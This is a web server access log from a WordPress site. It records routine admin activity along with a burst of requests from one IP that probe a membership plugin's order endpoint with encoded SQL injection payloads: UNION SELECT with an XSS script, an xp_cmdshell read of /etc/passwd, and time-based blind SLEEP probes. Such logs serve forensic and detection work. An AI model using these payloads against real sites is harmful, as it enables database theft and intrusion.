240.136.42.209 - - [05/Sep/2023:02:43:59 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 873 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:44:19 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 873 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
10.112.25.200 - - [05/Sep/2023:02:44:24 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit-comments.php?p=1&comment_status=moderated" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:44:39 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 873 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:44:44 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 872 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:44:59 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 873 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:45:08 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit.php?post_type=post" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
171.33.4.50 - - [05/Sep/2023:02:45:13 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 630 "http://www.sipress.com/wp-admin/post.php?post=9&action=edit" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
240.136.42.209 - - [05/Sep/2023:02:45:14 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 873 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:45:18 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit.php?post_type=post" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
10.112.25.200 - - [05/Sep/2023:02:45:28 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit-comments.php?p=1&comment_status=moderated" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:45:29 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 873 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:45:44 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 873 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:45:59 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 873 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:46:19 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 873 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
10.112.25.200 - - [05/Sep/2023:02:46:24 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit-comments.php?p=1&comment_status=moderated" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:46:32 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit.php?post_type=post" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
240.136.42.209 - - [05/Sep/2023:02:46:39 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 873 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:46:44 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 872 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:46:47 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit.php?post_type=post" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
240.136.42.209 - - [05/Sep/2023:02:47:04 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 873 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
171.33.4.50 - - [05/Sep/2023:02:47:11 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 630 "http://www.sipress.com/wp-admin/post.php?post=9&action=edit" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
240.136.42.209 - - [05/Sep/2023:02:47:14 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 873 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
10.112.25.200 - - [05/Sep/2023:02:47:21 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit-comments.php?p=1&comment_status=moderated" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:47:29 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 873 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:47:44 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 873 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:47:59 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 873 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:48:14 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 873 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
10.112.25.200 - - [05/Sep/2023:02:48:28 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit-comments.php?p=1&comment_status=moderated" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:48:29 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 873 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:48:44 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 873 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:48:52 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit.php?post_type=post" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
240.136.42.209 - - [05/Sep/2023:02:48:59 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 873 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:49:01 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:01 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a&RIfK=7146%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:01 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:01 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:01 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:01 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:02 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:02 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:02 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:02 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:02 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:02 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:02 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:02 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:02 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:02 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:02 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:02 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:02 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:02 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:02 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:02 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:02 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:02 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:02 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:02 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:02 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:02 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:02 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:02 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:02 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:02 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:02 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%29%20AND%20%28SELECT%203465%20FROM%20%28SELECT%28SLEEP%285%29%29%29tGKu%29%20AND%20%28%27kZbG%27%3D%27kZbG HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:05 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit.php?post_type=post" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
240.136.42.209 - - [05/Sep/2023:02:49:08 +0000] "GET /wp-admin/index.php HTTP/1.1" 200 19530 "http://www.sipress.com/wp-admin/edit.php?post_type=page" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:49:09 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 836 "http://www.sipress.com/wp-admin/index.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
171.33.4.50 - - [05/Sep/2023:02:49:11 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 630 "http://www.sipress.com/wp-admin/post.php?post=9&action=edit" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
240.136.42.209 - - [05/Sep/2023:02:49:12 +0000] "GET /wp-admin/edit-comments.php HTTP/1.1" 200 15593 "http://www.sipress.com/wp-admin/index.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:49:15 +0000] "GET / HTTP/1.1" 200 10298 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:49:15 +0000] "GET / HTTP/1.1" 200 10297 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:49:02 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203465%20FROM%20%28SELECT%28SLEEP%285%29%29%29tGKu%29%20AND%20%27UztS%27%3D%27UztS HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:17 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203465%20FROM%20%28SELECT%28SLEEP%280%29%29%29tGKu%29%20AND%20%27UztS%27%3D%27UztS HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
240.136.42.209 - - [05/Sep/2023:02:49:19 +0000] "GET / HTTP/1.1" 200 10297 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
240.136.42.209 - - [05/Sep/2023:02:49:19 +0000] "GET /wp-admin/edit-comments.php?p=1&comment_status=approved HTTP/1.1" 200 15055 "http://www.sipress.com/wp-admin/edit-comments.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:49:20 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit.php?post_type=post" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
10.112.25.200 - - [05/Sep/2023:02:49:21 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 579 "http://www.sipress.com/wp-admin/edit-comments.php?p=1&comment_status=moderated" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0"
47.53.122.78 - - [05/Sep/2023:02:49:17 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203465%20FROM%20%28SELECT%28SLEEP%285%29%29%29tGKu%29%20AND%20%27UztS%27%3D%27UztS HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
171.33.4.50 - - [05/Sep/2023:02:49:44 +0000] "POST /index.php/wp-json/wp/v2/pages/9?_locale=user HTTP/1.1" 200 2950 "http://www.sipress.com/wp-admin/post.php?post=9&action=edit" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
171.33.4.50 - - [05/Sep/2023:02:49:44 +0000] "POST /wp-admin/post.php?post=9&action=edit&meta-box-loader=1&meta-box-loader-nonce=aa59accc69&_locale=user HTTP/1.1" 302 484 "http://www.sipress.com/wp-admin/post.php?post=9&action=edit" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
171.33.4.50 - - [05/Sep/2023:02:49:44 +0000] "GET /index.php/new-page/?_wp-find-template=true HTTP/1.1" 200 2040 "http://www.sipress.com/wp-admin/post.php?post=9&action=edit" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
171.33.4.50 - - [05/Sep/2023:02:49:44 +0000] "GET /wp-admin/post.php?post=9&action=edit&message=4 HTTP/1.1" 200 54126 "http://www.sipress.com/wp-admin/post.php?post=9&action=edit" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
171.33.4.50 - - [05/Sep/2023:02:49:46 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 524 "http://www.sipress.com/wp-admin/post.php?post=9&action=edit" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
47.53.122.78 - - [05/Sep/2023:02:49:32 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%208741%20FROM%20%28SELECT%28SLEEP%285-%28IF%2846%3D46%2C0%2C5%29%29%29%29%29wvbs%29%20AND%20%27obAp%27%3D%27obAp HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:47 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203919%20FROM%20%28SELECT%28SLEEP%285-%28IF%2846%3D49%2C0%2C5%29%29%29%29%29XMmB%29%20AND%20%27lMGl%27%3D%27lMGl HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:48 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203571%20FROM%20%28SELECT%28SLEEP%285-%28IF%2846%3D57%2C0%2C5%29%29%29%29%29TDLq%29%20AND%20%27qtxr%27%3D%27qtxr HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
47.53.122.78 - - [05/Sep/2023:02:49:48 +0000] "GET /?rest_route=%2Fpmpro%2Fv1%2Forder&code=a%27%20AND%20%28SELECT%203256%20FROM%20%28SELECT%28SLEEP%285-%28IF%2857%3D49%2C0%2C5%29%29%29%29%29pnFm%29%20AND%20%27rBkS%27%3D%27rBkS HTTP/1.1" 200 505 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
171.33.4.50 - - [05/Sep/2023:02:49:49 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 525 "http://www.sipress.com/wp-admin/post.php?post=9&action=edit" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
171.33.4.50 - - [05/Sep/2023:02:49:49 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 200 524 "http://www.sipress.com/wp-admin/post.php?post=9&action=edit" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
171.33.4.50 - - [05/Sep/2023:02:49:49 +0000] "GET /index.php/new-page/ HTTP/1.1" 200 10654 "http://www.sipress.com/wp-admin/post.php?post=9&action=edit" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
171.33.4.50 - - [05/Sep/2023:02:49:49 +0000] "GET /wp-includes/css/admin-bar.min.css?ver=6.1.1 HTTP/1.1" 200 4169 "http://www.sipress.com/index.php/new-page/" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
171.33.4.50 - - [05/Sep/2023:02:49:54 +0000] "GET / HTTP/1.1" 200 10315 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
171.33.4.50 - - [05/Sep/2023:02:49:54 +0000] "GET / HTTP/1.1" 200 10315 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
